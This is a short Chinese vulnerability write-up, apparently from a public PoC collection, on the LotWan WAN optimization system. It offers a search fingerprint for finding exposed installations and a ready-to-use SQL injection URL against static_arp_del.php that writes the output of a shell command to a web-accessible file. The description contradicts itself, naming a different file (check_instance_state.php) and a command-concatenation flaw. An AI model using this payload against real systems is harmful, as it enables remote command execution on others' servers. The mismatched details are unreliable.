



# 华夏创新 LotWan广域网优化系统 static_arp_del.php SQL注入漏洞

## 漏洞描述

华夏创新 LotWan广域网优化系统check_instance_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>华夏创新 LotWan广域网优化系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="LotWan 广域网优化系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1635942598942-6671fa50-5052-43f6-ab40-bf2c8403bdf8.png)

存在漏洞的文件为 static_arp_del.php, 通过union注入写入文件

```php
/acc/bindipmac/static_arp_del.php?x=1&arpName=1' and 0 union select 1,'||id>cmd.txt||',3,4,5,6,7,8--
```

再访问 `/acc/bindipmac/cmd.txt`

![img](../../../.vuepress/public/img/1635944083151-f56d838d-54e4-4d28-a6ac-6e079e936cf3.png)

